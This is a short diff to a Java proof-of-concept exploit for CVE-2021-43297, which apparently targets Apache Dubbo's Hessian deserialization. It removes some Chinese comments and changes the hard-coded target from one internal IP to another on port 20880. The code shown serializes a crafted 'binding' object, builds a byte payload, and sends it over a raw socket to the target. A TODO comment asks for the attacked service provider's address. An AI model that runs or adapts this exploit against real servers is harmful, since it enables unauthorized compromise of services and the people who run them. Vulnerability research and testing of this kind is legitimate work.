@@ -37,16 +37,11 @@ public class CVE_2021_43297 {
         Reflections.setFieldValue(binding, "fullName", "<<<<<");
 //        fullName.set(binding, "<<<<<");  // 方便定位属性值的
 
-
-
-        //############################################################################################
-        // 写入binding
         ByteArrayOutputStream binding2bytes = new ByteArrayOutputStream();
         Hessian2Output outBinding = new Hessian2Output(binding2bytes);
         outBinding.writeObject(binding);
         outBinding.flushBuffer();
-        //############################################################################################
-        // binding序列化后的byte数组
+
         byte[] bindingBytes = binding2bytes.toByteArray();
 
         // header.
@@ -76,7 +71,6 @@ public class CVE_2021_43297 {
         for (int i = 0; i < bindingBytes.length; i++) {
             payload[i + bytes.length-1] = bindingBytes[i];
         }
-        //############################################################################################
 
 
         // 输出字节流的十六进制
@@ -92,7 +86,7 @@ public class CVE_2021_43297 {
         System.out.println(new String(payload,0,payload.length));
 
         //todo 此处填写被攻击的dubbo服务提供者地址和端口
-        Socket socket = new Socket("10.41.230.66", 20880);
+        Socket socket = new Socket("10.58.120.200", 20880);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(payload);
         outputStream.flush();
